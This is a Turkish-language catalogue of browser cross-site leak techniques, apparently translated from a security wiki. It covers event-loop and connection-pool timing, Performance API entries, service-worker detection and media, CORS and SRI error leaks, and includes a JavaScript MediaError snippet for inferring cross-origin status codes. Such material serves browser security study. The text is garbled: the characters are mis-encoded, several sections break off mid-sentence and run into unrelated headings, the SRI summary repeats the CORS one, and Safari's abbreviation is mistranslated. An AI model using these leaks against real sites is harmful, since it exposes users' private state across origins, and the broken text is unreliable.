Bu XS-Leak, bir saldÄ±rganÄ±n **Ã§apraz kaynaklÄ± bir sayfanÄ±n bir Ã¶deme isteÄŸi baÅŸlattÄ±ÄŸÄ±nÄ± tespit etmesine** olanak tanÄ±r.

Ã‡Ã¼nkÃ¼ **aynÄ± anda yalnÄ±zca bir Ã¶deme isteÄŸi etkin olabilir**, hedef web sitesi Ã–deme Ä°steÄŸi API'sini kullanÄ±yorsa, bu API'yi kullanmaya yÃ¶nelik herhangi bir **daha sonraki giriÅŸim baÅŸarÄ±sÄ±z olacak** ve bir **JavaScript istisnasÄ±na** neden olacaktÄ±r. SaldÄ±rgan, Ã–deme API'sinin kullanÄ±lÄ±p kullanÄ±lmadÄ±ÄŸÄ±nÄ± **periyodik olarak Ã–deme API'si UI'sini gÃ¶stermeye Ã§alÄ±ÅŸarak** sÃ¶mÃ¼rebilir. Bir deneme istisna oluÅŸturursa, hedef web sitesi ÅŸu anda bunu kullanÄ±yor demektir. SaldÄ±rgan, bu periyodik denemeleri hemen oluÅŸturduktan sonra UI'yi kapatÄ±p gizleyebilir.

### Olay DÃ¶ngÃ¼sÃ¼nÃ¼n ZamanlamasÄ± <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme YÃ¶ntemleri**:
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Ã–zet**: Tek iÅŸ parÃ§acÄ±klÄ± JS olay dÃ¶ngÃ¼sÃ¼nÃ¼ kÃ¶tÃ¼ye kullanarak bir webin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§Ã¼n.
* **Kod Ã–rneÄŸi**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iÅŸ parÃ§acÄ±klÄ± bir olay dÃ¶ngÃ¼sÃ¼](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eÅŸzamanlÄ±lÄ±k modeli Ã¼zerinde Ã§alÄ±ÅŸÄ±r, bu da **aynÄ± anda yalnÄ±zca bir gÃ¶revi yÃ¼rÃ¼tebileceÄŸi** anlamÄ±na gelir. Bu Ã¶zellik, **farklÄ± bir kÃ¶kenden gelen kodun yÃ¼rÃ¼tÃ¼lmesinin ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ Ã¶lÃ§mek** iÃ§in sÃ¶mÃ¼rÃ¼lebilir. Bir saldÄ±rgan, sÃ¼rekli olarak sabit Ã¶zelliklere sahip olaylarÄ± gÃ¶ndererek kendi kodunun olay dÃ¶ngÃ¼sÃ¼ndeki yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§ebilir. Bu olaylar, olay havuzu boÅŸ olduÄŸunda iÅŸlenecektir. DiÄŸer kÃ¶kenler de aynÄ± havuza olay gÃ¶nderiyorsa, bir saldÄ±rgan, kendi gÃ¶revlerinin yÃ¼rÃ¼tÃ¼lmesindeki gecikmeleri gÃ¶zlemleyerek bu harici olaylarÄ±n yÃ¼rÃ¼tÃ¼lme sÃ¼resini Ã§Ä±karabilir. Gecikmeleri izlemek iÃ§in olay dÃ¶ngÃ¼sÃ¼nÃ¼ denetlemek, farklÄ± kÃ¶kenlerden gelen kodun yÃ¼rÃ¼tme sÃ¼resini ortaya Ã§Ä±karabilir ve hassas bilgilerin ortaya Ã§Ä±kmasÄ±na neden olabilir.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda, **daha kesin Ã¶lÃ§Ã¼mler** elde etmek iÃ§in **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfanÄ±n yÃ¼klenmeden Ã¶nce kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### MeÅŸgul Olay DÃ¶ngÃ¼sÃ¼ <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme YÃ¶ntemleri**:
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Ã–zet**: Bir web iÅŸleminin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§menin bir yolu, bir iÅŸ parÃ§acÄ±ÄŸÄ±n olay dÃ¶ngÃ¼sÃ¼nÃ¼ kasÄ±tlÄ± olarak engellemek ve ardÄ±ndan olay dÃ¶ngÃ¼sÃ¼nÃ¼n tekrar kullanÄ±labilir hale gelmesi iÃ§in geÃ§en sÃ¼reyi zamanlamaktÄ±r. Bir iÅŸ parÃ§acÄ±ÄŸÄ±na (uzun bir hesaplama veya senkron API Ã§aÄŸrÄ±sÄ± gibi) bir engelleme iÅŸlemi ekleyerek ve sonraki kodun yÃ¼rÃ¼tme sÃ¼resini izleyerek, engelleme sÃ¼resi boyunca olay dÃ¶ngÃ¼sÃ¼nde yÃ¼rÃ¼tÃ¼len gÃ¶revlerin sÃ¼resini Ã§Ä±karabilirsiniz. Bu teknik, JavaScript'in tek iÅŸ parÃ§acÄ±klÄ± olay dÃ¶ngÃ¼sÃ¼nÃ¼n, gÃ¶revlerin sÄ±rayla yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼, diÄŸer iÅŸlemlerin aynÄ± iÅŸ parÃ§acÄ±ÄŸÄ±nÄ± paylaÅŸan diÄŸer iÅŸlemlerin performansÄ± veya davranÄ±ÅŸÄ± hakkÄ±nda bilgi saÄŸlayabilir.

* **Kod Ã–rneÄŸi**:

Olay dÃ¶ngÃ¼sÃ¼nÃ¼ kilitleyerek yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§me tekniÄŸinin Ã¶nemli bir avantajÄ±, **Site Ä°zolasyonu**'nu atlatma potansiyeline sahip olmasÄ±dÄ±r. **Site Ä°zolasyonu**, farklÄ± web sitelerini ayrÄ± iÅŸlemlere ayÄ±ran bir gÃ¼venlik Ã¶zelliÄŸidir ve kÃ¶tÃ¼ niyetli sitelerin diÄŸer sitelerin hassas verilerine doÄŸrudan eriÅŸmesini engellemeyi amaÃ§lar. Bununla birlikte, paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ aracÄ±lÄ±ÄŸÄ±yla baÅŸka bir kÃ¶kenin yÃ¼rÃ¼tme zamanlamasÄ±nÄ± etkileyerek, bir saldÄ±rgan o kÃ¶kenin faaliyetleri hakkÄ±nda bilgi Ã§Ä±karabilir. Bu yÃ¶ntem, diÄŸer kÃ¶kenin verilerine doÄŸrudan eriÅŸime dayanmaz, ancak o kÃ¶kenin faaliyetlerinin paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ Ã¼zerindeki etkisini gÃ¶zlemler ve bÃ¶ylece **Site Ä°zolasyonu** tarafÄ±ndan oluÅŸturulan koruyucu engelleri atlatÄ±r.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda, **daha kesin Ã¶lÃ§Ã¼mler** elde etmek iÃ§in **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfanÄ±n yÃ¼klenmeden Ã¶nce kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### BaÄŸlantÄ± Havuzu

* **Dahil Etme YÃ¶ntemleri**: JavaScript Ä°stekleri
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Ã–zet**: Bir saldÄ±rgan, tÃ¼m soketleri 1 hariÃ§ kilitler, hedef webi yÃ¼kler ve aynÄ± anda baÅŸka bir sayfayÄ± yÃ¼kler, son sayfanÄ±n yÃ¼klenmeye baÅŸlamasÄ± iÃ§in geÃ§en sÃ¼re, hedef sayfanÄ±n yÃ¼klenme sÃ¼residir.
* **Kod Ã–rneÄŸi**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

TarayÄ±cÄ±lar sunucu iletiÅŸimi iÃ§in soketleri kullanÄ±r, ancak iÅŸletim sistemi ve donanÄ±mÄ±n sÄ±nÄ±rlÄ± kaynaklarÄ± nedeniyle, tarayÄ±cÄ±lar eÅŸzamanlÄ± soketler Ã¼zerinde bir sÄ±nÄ±rlama uygulamak zorunda kalÄ±r. SaldÄ±rganlar bu sÄ±nÄ±rlamayÄ± aÅŸaÄŸÄ±daki adÄ±mlarla sÃ¶mÃ¼rebilir:

1. TarayÄ±cÄ±nÄ±n soket sÄ±nÄ±rÄ±nÄ± belirleyin, Ã¶rneÄŸin 256 global soket.
2. 255 soketi uzun bir sÃ¼re boyunca iÅŸgal ederek, baÄŸlantÄ±larÄ± tamamlamadan aÃ§Ä±k tutacak ÅŸekilde Ã§eÅŸitli ana bilgisayarlara 255 istek baÅŸlatÄ±n.
3. 256. soketi hedef sayfaya bir istek gÃ¶ndermek iÃ§in kullanÄ±n.
4. FarklÄ± bir ana bilgisayara 257. bir istek yapmaya Ã§alÄ±ÅŸÄ±n. 2. ve 3. adÄ±mlara gÃ¶re tÃ¼m soketler kullanÄ±mda olduÄŸundan,
## Performans API Teknikleri

[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarÄ±nÄ±n performans metriklerine dair bilgiler sunar ve [`Kaynak Zamanlama API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) tarafÄ±ndan daha da zenginleÅŸtirilir. Kaynak Zamanlama API, isteklerin sÃ¼releri gibi ayrÄ±ntÄ±lÄ± aÄŸ istek zamanlamalarÄ±nÄ±n izlenmesini saÄŸlar. Ã–zellikle sunucular, yanÄ±tlarÄ±nda `Timing-Allow-Origin: *` baÅŸlÄ±ÄŸÄ±nÄ± iÃ§eriyorsa, transfer boyutu ve alan arama sÃ¼resi gibi ek veriler kullanÄ±labilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yÃ¶ntemler aracÄ±lÄ±ÄŸÄ±yla alÄ±nabilir ve performansla ilgili bilgilerin kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar. AyrÄ±ca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgalarÄ± arasÄ±ndaki farkÄ± hesaplayarak yÃ¼rÃ¼tme sÃ¼relerinin Ã¶lÃ§Ã¼lmesini kolaylaÅŸtÄ±rÄ±r. Ancak, Chrome gibi bazÄ± tarayÄ±cÄ±larda, `performance.now()`'un hassasiyeti milisaniyelerle sÄ±nÄ±rlÄ± olabilir, bu da zamanlama Ã¶lÃ§Ã¼mlerinin ayrÄ±ntÄ±sÄ±nÄ± etkileyebilir.

Zamanlama Ã¶lÃ§Ã¼mlerinin Ã¶tesinde, Performans API'si gÃ¼venlikle ilgili bilgiler iÃ§in de kullanÄ±labilir. Ã–rneÄŸin, Chrome'da `performance` nesnesindeki sayfalarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, `X-Frame-Options`'Ä±n uygulanmasÄ±nÄ± gÃ¶sterebilir. Ã–zellikle, bir sayfa `X-Frame-Options` nedeniyle bir Ã§erÃ§evede gÃ¶rÃ¼ntÃ¼lenmesi engellenirse, `performance` nesnesinde kaydedilmeyeceÄŸinden sayfanÄ±n Ã§erÃ§eveleme politikalarÄ± hakkÄ±nda ipucu saÄŸlar.

### Hata SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Hatalara yol aÃ§an bir istek, bir kaynak zamanlama giriÅŸi oluÅŸturmaz.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Hatalara yol aÃ§an bir istek, bir performans giriÅŸi oluÅŸturmaz, bu nedenle HTTP yanÄ±t durum kodlarÄ± arasÄ±nda **farklÄ±lÄ±k yapmak mÃ¼mkÃ¼ndÃ¼r**.

### Stil Yeniden YÃ¼kleme HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** TarayÄ±cÄ± hatasÄ± nedeniyle hatalara yol aÃ§an istekler iki kez yÃ¼klenir.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Ã–nceki teknikte, GC'deki tarayÄ±cÄ± hatalarÄ± nedeniyle **yÃ¼klenemeyen kaynaklar iki kez yÃ¼klenir** olarak belirlendi. Bu, Performans API'sinde birden fazla giriÅŸ oluÅŸturur ve bu nedenle algÄ±lanabilir.

### Ä°stek BirleÅŸtirme HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Hatalara yol aÃ§an istekler birleÅŸtirilemez.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalenin bir tablosunda bulundu, ancak teknikle ilgili bir aÃ§Ä±klama bulunamadÄ±. Bununla birlikte, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### BoÅŸ Sayfa SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** BoÅŸ yanÄ±tlar, kaynak zamanlama giriÅŸi oluÅŸturmaz.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldÄ±rgan, bir isteÄŸin boÅŸ bir HTTP yanÄ±t gÃ¶vdesiyle sonuÃ§landÄ±ÄŸÄ±nÄ± tespit edebilir Ã§Ã¼nkÃ¼ **boÅŸ sayfalar bazÄ± tarayÄ±cÄ±larda performans giriÅŸi oluÅŸturmaz**.

### **XSS-Auditor SÄ±zÄ±ntÄ±sÄ±**

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** GÃ¼venlik Ä°ddialarÄ±nda XSS Denetleyicisini kullanarak, saldÄ±rganlar, oluÅŸturulan yÃ¼klerin denetleyicinin filtreleme mekanizmasÄ±nÄ± tetiklediÄŸinde yanÄ±tlarda meydana gelen deÄŸiÅŸiklikleri gÃ¶zlemleyerek belirli web sayfasÄ± Ã¶ÄŸelerini tespit edebilir.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

GÃ¼venlik Ä°ddialarÄ±nda (SA), baÅŸlangÄ±Ã§ta Cross-Site Scripting (XSS) saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in tasarlanan XSS Denetleyicisi, paradoksal bir ÅŸekilde hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±na neden olmak iÃ§in kullanÄ±labilir. Bu yerleÅŸik Ã¶zellik Google Chrome'dan (GC) kaldÄ±rÄ±ldÄ±, ancak SA'da hala mevcuttur. 2013 yÄ±lÄ±nda, Braun ve Heiderich, XSS Denetleyicisinin yanlÄ±ÅŸ pozitiflere yol aÃ§abilecek ÅŸekilde meÅŸru betikleri engelleyebileceÄŸini gÃ¶sterdiler. AraÅŸtÄ±rmacÄ±lar, bu temel alÄ±narak, hassas bilgilerin Ã§Ä±karÄ±lmasÄ± ve Ã§apraz kaynak sayfalarÄ±nda belirli iÃ§eriÄŸin tespit edilmesi iÃ§in teknikler geliÅŸtirdiler. Bu kavrama XS-Leak denir ve baÅŸlangÄ±Ã§ta Terada tarafÄ±ndan bildirilmiÅŸ ve Heyes tarafÄ±ndan bir blog yazÄ±sÄ±nda ayrÄ±ntÄ±lÄ± olarak aÃ§Ä±klanmÄ±ÅŸtÄ±r. Bu teknikler GC'deki XSS Denetleyicisiyle ilgiliyken, SA'da XSS Denetleyicisi tarafÄ±ndan engellenen sayfalar, Performans API'sinde giriÅŸ oluÅŸturmaz, bÃ¶ylece hassas bilgilerin sÄ±zdÄ±rÄ±labileceÄŸi bir yÃ¶ntem ortaya Ã§Ä±kar.

### X-Frame SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing
### YÃ¶nlendirme BaÅŸlangÄ±cÄ± SÄ±zÄ±ntÄ±sÄ±

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirme
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet**: Kaynak zamanlama giriÅŸi, bir yÃ¶nlendirmenin baÅŸlangÄ±Ã§ zamanÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

BazÄ± tarayÄ±cÄ±larÄ±n, Ã§apraz kaynak istekleri iÃ§in Ã§ok fazla bilgi kaydettiÄŸi davranÄ±ÅŸÄ±nÄ± istismar eden bir XS-Leak Ã¶rneÄŸi bulduk. Standart, Ã§apraz kaynak kaynaklarÄ± iÃ§in sÄ±fÄ±ra ayarlanmasÄ± gereken bir alt kÃ¼me Ã¶zniteliÄŸi tanÄ±mlar. Ancak, **SA**'da hedef sayfa tarafÄ±ndan yÃ¶nlendirilip yÃ¶nlendirilmediÄŸi, **Performans API**'sini sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek tespit edilebilir.

### SÃ¼re YÃ¶nlendirme SÄ±zÄ±ntÄ±sÄ±

* **Ekleme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirme
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet**: Bir yÃ¶nlendirme gerÃ§ekleÅŸtiÄŸinde zamanlama giriÅŸlerinin sÃ¼resi negatiftir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, bir yÃ¶nlendirme sonucunda gerÃ§ekleÅŸen isteklerin sÃ¼resi **negatif** ve bu nedenle yÃ¶nlendirme olmayan isteklerden **ayrÄ±labilir**.

### CORP SÄ±zÄ±ntÄ±sÄ±

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet**: CORP ile korunan kaynaklar, kaynak zamanlama giriÅŸleri oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

BazÄ± durumlarda, **nextHopProtocol giriÅŸi** bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±labilir. GC'de, **CORP baÅŸlÄ±ÄŸÄ±** ayarlandÄ±ÄŸÄ±nda, nextHopProtocol **boÅŸ** olacaktÄ±r. CORP etkin kaynaklar iÃ§in SA hiÃ§bir performans giriÅŸi oluÅŸturmayacaktÄ±r.

### Hizmet Ä°ÅŸÃ§isi

* **Ekleme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha fazla bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Ã–zet**: Belirli bir kÃ¶k iÃ§in bir hizmet iÅŸÃ§isinin kaydedilip kaydedilmediÄŸi tespit edilebilir.
* **Kod Ã–rneÄŸi**:

Hizmet iÅŸÃ§ileri, bir kÃ¶kte Ã§alÄ±ÅŸan olaya dayalÄ± betik baÄŸlamlarÄ±dÄ±r. Bir web sayfasÄ±nÄ±n arka planÄ±nda Ã§alÄ±ÅŸÄ±rlar ve Ã§evrimdÄ±ÅŸÄ± web uygulamasÄ± oluÅŸturmak iÃ§in kaynaklarÄ± **Ã¶n belleÄŸe alabilir**, deÄŸiÅŸtirebilir ve Ã¶nbelleÄŸe alabilirler.\
Bir hizmet iÅŸÃ§isi tarafÄ±ndan **Ã¶n belleÄŸe alÄ±nan bir kaynak**, **iframe** aracÄ±lÄ±ÄŸÄ±yla eriÅŸildiÄŸinde, kaynak **hizmet iÅŸÃ§isi Ã¶nbelleÄŸinden yÃ¼klenir**.\
KaynaÄŸÄ±n **hizmet iÅŸÃ§isi Ã¶nbelleÄŸinden yÃ¼klendiÄŸi** tespit edilmek istenirse, **Performans API** kullanÄ±labilir.\
Bu ayrÄ±ca bir Zamanlama saldÄ±rÄ±sÄ±yla da yapÄ±labilir (daha fazla bilgi iÃ§in makaleye bakÄ±n).

### Ã–nbellek

* **Ekleme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Zamanlama
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Ã–zet**: Bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ± kontrol edilebilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performans API](xs-search.md#performance-api) kullanÄ±larak bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ± kontrol edilebilir.

### AÄŸ SÃ¼resi

* **Ekleme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Ã–zet**: Bir isteÄŸin aÄŸ sÃ¼resi, `performance` API'sÄ±ndan alÄ±nabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata MesajlarÄ± TekniÄŸi

### Medya HatasÄ±

* **Ekleme YÃ¶ntemleri**: HTML Ã–ÄŸeleri (Video, Ses)
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Ã–zet**: Firefox'ta Ã§apraz kÃ¶kenli bir isteÄŸin durum kodu kesin bir ÅŸekilde sÄ±zdÄ±rÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` arayÃ¼zÃ¼nÃ¼n `message` Ã¶zelliÄŸi, baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klenen kaynaklarÄ± benzersiz bir dizeyle tanÄ±mlar. Bir saldÄ±rgan, bu Ã¶zelliÄŸi kullanarak mesaj iÃ§eriÄŸini gÃ¶zlemleyerek bir kaynak Ã¼zerindeki cross-origin yanÄ±t durumunu Ã§Ä±karabilir.

### CORS HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik Ä°ddialarÄ± (SA) iÃ§inde, CORS hata mesajlarÄ± yanlÄ±ÅŸlÄ±kla yÃ¶nlendirilen isteklerin tam URL'sini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldÄ±rganÄ±n Webkit tabanlÄ± tarayÄ±cÄ±larÄ±n CORS isteklerini nasÄ±l iÅŸlediÄŸini istismar ederek cross-origin bir site'nin yÃ¶nlendirme hedefini Ã§Ä±karmasÄ±nÄ± saÄŸlar. Ã–zellikle, kullanÄ±cÄ± durumuna dayalÄ± olarak bir yÃ¶nlendirme yapan hedef siteye bir CORS etkin istek gÃ¶nderildiÄŸinde ve tarayÄ±cÄ± daha sonra isteÄŸi reddederse, hata mesajÄ± iÃ§inde yÃ¶nlendirmenin hedefinin tam URL'si aÃ§Ä±ÄŸa Ã§Ä±kar. Bu zafiyet, sadece yÃ¶nlendirmenin gerÃ§ekleÅŸtiÄŸini deÄŸil, aynÄ± zamanda yÃ¶nlendirmenin hedefini ve iÃ§erebileceÄŸi **duyarlÄ± sorgu parametrelerini** de ortaya Ã§Ä±karÄ±r.

### SRI HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik Ä°ddialarÄ± (SA) iÃ§inde, CORS hata mesajlarÄ± yanlÄ±ÅŸlÄ±kla yÃ¶nlendirilen isteklerin tam URL'sini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

